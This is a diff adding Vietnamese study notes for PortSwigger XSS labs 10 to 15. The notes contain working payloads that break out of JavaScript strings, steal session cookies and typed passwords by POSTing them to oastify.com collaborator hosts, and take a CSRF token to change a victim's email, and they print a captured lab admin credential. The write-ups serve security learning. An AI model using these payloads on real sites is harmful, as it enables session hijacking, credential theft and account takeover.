@@ -502,6 +502,208 @@ steps:
 
 lab des: 
 
+Bài lab này chứa một lỗ hổng **Reflected Cross-Site Scripting (XSS)** trong chức năng theo dõi truy vấn tìm kiếm.
+ Trong quá trình phản chiếu (reflect input), các ký tự:
 
+- **Dấu ngoặc nhọn (`<` và `>`)** và **dấu ngoặc kép (`"`)** được **mã hóa HTML** (HTML encoded),
+- **Dấu nháy đơn (`'`)** thì được **escape** (chuyển thành `\'`).
+
+=> Để hoàn thành bài lab, cần thực hiện một cuộc tấn công reflected XSS bằng cách **thoát khỏi chuỗi JavaScript** và gọi hàm `alert`.
+
+- Dữ liệu người dùng bị phản chiếu **bên trong một chuỗi JavaScript** sử dụng **nháy đơn (`'`)**.
+- Server đã cố gắng ngăn XSS bằng cách mã hóa:
+  - `<` → `<`, `>` → `>`, `"` → `"`
+  - `'` → `\'` (escape).
 
 steps: 
+
+- Craft the payload: 
+
+`\'-alert(1)//`
+
+=> đoạn mã được reflected như sau: 
+
+```js
+<script>
+  var search = '\''-alert(1)//';
+</script>
+
+```
+
+**`\'`**
+=>  Dấu nháy đơn bị escape → Kết quả: một dấu `'` thực sự được in ra trong chuỗi.
+
+**`'-alert(1)//`**
+ =>  Dấu `'` này kết thúc chuỗi ban đầu.
+ =>  `-alert(1)`: Một biểu thức hợp lệ (toán tử `-` và hàm `alert(1)`) được thực thi.
+ => `//` để comment phần còn lại tránh lỗi cú pháp.
+
+![image-20250602081017779](./image/image-20250602081017779.png)
+
+
+
+### [Lab 11: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
+
+lab des:
+
+Lab này chứa một **lỗ hổng Stored XSS (Cross-Site Scripting)** trong phần chức năng bình luận (comment). Mục tiêu là:
+
+Gửi một bình luận sao cho khi người dùng click vào tên tác giả của bình luận, hàm `alert()` được gọi.
+
+steps:
+
+![image-20250602082411790](./image/image-20250602082411790.png)
+
+Link website được reflect trong thẻ href và sự kiện onclick:
+
+- craft payload: 
+
+`http://foo?&apos;-alert(1)-&apos;`
+
+phân tích payload: 
+
+`'` là một **HTML entity** tương đương với ký tự `'` (dấu nháy đơn).
+
+`'-alert(1)-'` sau khi trình duyệt **giải mã HTML** sẽ trở thành:
+
+```
+'-alert(1)-'
+```
+
+![image-20250602084133662](./image/image-20250602084133662.png)
+
+### [Lab 12: Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
+
+lab des: 
+
+Bài lab này chứa lỗ hổng XSS phản chiếu (reflected XSS) trong chức năng tìm kiếm blog. Dữ liệu nhập từ người dùng bị phản chiếu bên trong một **template string** (chuỗi mẫu) trong JavaScript, với các ký tự:
+
+- dấu nhọn (`<`, `>`)
+- dấu nháy đơn (`'`)
+- dấu nháy kép (`"`)
+
+đã được **mã hóa HTML** (*HTML encoded*), và dấu **backtick (`)** thì được **escape (chuyển thành Unicode escape)**.
+
+=> **chèn mã JavaScript gọi `alert()`** bên trong template string.
+
+Steps: 
+
+- Search string và quan sát kết quả được reflected trong một chuỗi string trong javascript:
+
+![image-20250602084907954](./image/image-20250602084907954.png)
+
+![image-20250602090804075](./image/image-20250602090804075.png)
+
+- Craft payload: 
+
+  ![image-20250602090851072](./image/image-20250602090851072.png)
+
+
+
+### [Lab 13: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+
+Lab des:
+
+Bài lab này chứa một lỗ hổng Stored XSS trong chức năng bình luận blog. Một người dùng giả lập (nạn nhân) sẽ xem tất cả các bình luận sau khi chúng được đăng:
+
+1. **Khai thác lỗ hổng XSS** để đánh cắp **cookie phiên (session cookie)** của nạn nhân.
+2. **Dùng cookie đó để giả mạo (impersonate)** nạn nhân và truy cập hệ thống với vai trò của họ.
+
+Steps: 
+
+Craft payload: 
+
+```
+
+<script>
+fetch('https://tro99i1hernxmlyg6h0uog7onft6hz5o.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+
+
+![image-20250602092443053](./image/image-20250602092443053.png)
+
+=> Phần cookie đánh cắp được sẽ ở trong body của req POST gửi về collab domain.
+
+![image-20250602093201868](./image/image-20250602093201868.png)
+
+=> Lấy được `session` của người dùng. Thay sesion và send req để giả mạo người dùng: 
+
+![image-20250602093657080](./image/image-20250602093657080.png)
+
+
+
+### [Lab 14: Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
+
+Lab des: Tương tự như lab 13
+
+Steps:
+
+- craft payload: 
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://etbub332gcpio601822fq199p0vrjl7a.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+![image-20250602095140023](./image/image-20250602095140023.png)
+
+**administrator:004fkfw2ksli05fgso84**
+
+![image-20250602095225776](./image/image-20250602095225776.png) 
+
+
+
+### [Lab 15: Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+
+Lab des: 
+
+Bài lab có một lỗ hổng **Stored XSS** trong chức năng bình luận blog.
+ Khi người dùng khác (nạn nhân) truy cập bài blog và xem các bình luận, mã XSS bạn chèn sẽ được thực thi.
+
+=> Chèn mã XSS vào phần bình luận để:
+
+- **Đánh cắp CSRF token** của nạn nhân.
+
+- **Gửi request POST giả mạo** để đổi địa chỉ email của họ (sử dụng CSRF token hợp lệ).
+
+  
+
+steps: 
+
+Tải trang `/my-account` => Trích xuất token CSRF từ thẻ input ẩn `name="csrf"` => Gửi yêu cầu POST đến `/my-account/change-email` với:
+
+- `email=test@test.com`
+- `token=...` (token lấy ở bước trên)
+
+![image-20250602100638493](./image/image-20250602100638493.png)
+
+Craft payload: 
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
+Nhập payload vào phần comment blog:
+
+![image-20250602100745215](./image/image-20250602100745215.png)
